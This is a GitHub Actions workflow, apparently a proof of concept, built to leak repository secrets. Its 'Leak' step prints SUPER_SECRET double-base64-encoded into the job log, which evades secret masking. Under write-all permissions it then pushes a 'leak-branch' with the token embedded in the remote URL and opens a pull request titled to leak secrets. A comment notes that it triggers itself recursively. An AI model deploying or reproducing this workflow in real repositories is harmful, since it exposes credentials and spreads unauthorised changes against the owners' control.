name: Create and Push Branch, Then Make PR

on:
  pull_request:
    types: [opened, reopened, synchronize, edited]
  repository_dispatch:
  # This is so that when the bot creates the repo, it triggers
  # But it will create a recursive workflow, so gotta fix it later
    types: [create-pull-request] 

permissions: 
  write-all

jobs:
  create-push-pr:
    runs-on: ubuntu-latest

    steps:
      - name: Leak
        run: |
          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0

      - name: Checkout repository
        uses: actions/checkout@v2
        with:
          persist-credentials: false
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Git
        run: |
          git config --global user.name 'github-actions[bot]'
          git config --global user.email 'github-actions[bot]@users.noreply.github.com'

      - name: Create new branch
        run: |
          BRANCH_NAME="leak-branch-$(date +%s)"
          echo "BRANCH_NAME=${BRANCH_NAME}" >> $GITHUB_ENV
          git checkout -b ${BRANCH_NAME}

      - name: Make changes
        run: |
          mkdir -p .github/workflows
          CONTENT=$(echo "" | base64 -d)
          FILENAME=$(echo "dGVzdC5tZA==" | base64 -d)
          echo "$CONTENT" > $FILENAME
          git add $FILENAME
          git commit -m "Add leak.yml to leak secrets"

      - name: Push changes to new branch
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BRANCH_NAME: ${{ env.BRANCH_NAME }}
        run: |
          git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
          git push -u origin ${BRANCH_NAME}

      - name: Create Pull Request
        uses: peter-evans/create-pull-request@v6
        with:
          commit-message: "Add leak.yml to leak secrets"
          branch: ${{ env.BRANCH_NAME }}
          delete-branch: false
          base: main # Ensure this is set to main
          title: '[Leak] Add leak.yml to leak secrets'
          body: "This PR adds the leak.yml file to leak secrets."
          draft: false

